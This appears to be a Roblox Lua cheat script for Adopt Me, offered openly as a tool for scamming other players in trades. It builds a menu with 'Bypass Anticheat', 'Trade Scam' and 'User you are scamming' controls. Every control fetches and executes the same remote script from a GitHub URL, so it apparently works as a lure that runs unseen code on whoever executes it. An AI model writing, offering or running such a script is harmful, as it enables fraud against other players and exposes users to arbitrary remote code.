local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Create the UI Window
local Window = Rayfield:CreateWindow({
    Name = "🔥 AdoptMe Freeze Trade 🔥",
    LoadingTitle = "Loading Rayfield...",
    LoadingSubtitle = "By DHubOnTop",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "MyScriptData",
        FileName = "UserSettings"
    },
    Discord = {
        Enabled = false,
        Invite = "YourDiscordInvite",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Script Key System",
        Subtitle = "Enter your key below",
        Note = "Find the key in our Discord",
        FileName = "KeyData",
        SaveKey = false,
        GrabKeyFromSite = false,
        Key = {"DHubOnTop"}
    }
})

-- Create a Main Tab
local MainTab = Window:CreateTab("Main", 4483362458)

-- Create a Button with Debugging
local Button = MainTab:CreateButton({
    Name = "Bypass Anticheat(Wait 5 min to bypass)",
    Callback = function()
        print("Button clicked!")  -- Debugging print to verify if the callback is triggered
        local success, err = pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
        end)
        if not success then
            warn("Error in Button Callback:", err)
        end
    end
})

-- Create a Toggle with Improved Callback
local Toggle = MainTab:CreateToggle({
    Name = "Trade Scam",
    CurrentValue = false,
    Callback = function(state)  -- Ensure 'state' is passed as an argument
        print("Toggle state:", state)  -- Debugging print statement
        local success, err = pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
        end)
        if not success then
            warn("Error in Toggle Callback:", err)
        end
    end
})

-- Create an Input Box
local Input = MainTab:CreateInput({
    Name = "User you are scamming",
    PlaceholderText = "Type here...",
    RemoveTextAfterFocusLost = false,
    Callback = function(input)
        print("Input Received:", input)
        local success, err = pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
        end)
        if not success then
            warn("Error in Input Callback:", err)
        end
    end
})

-- Create a Label
local Label = MainTab:CreateLabel("Made with ❤️ by DHubOnTop")

-- Notify the User
Rayfield:Notify({
    Title = "Script Activated",
    Content = "Made with ❤️ by DHubOnTop",
    Duration = 5,
    Image = 4483362458,
    Actions = {
        Ignore = {
            Name = "OK",
            Callback = function()
                print("User dismissed notification")
            end
        }
    }
})
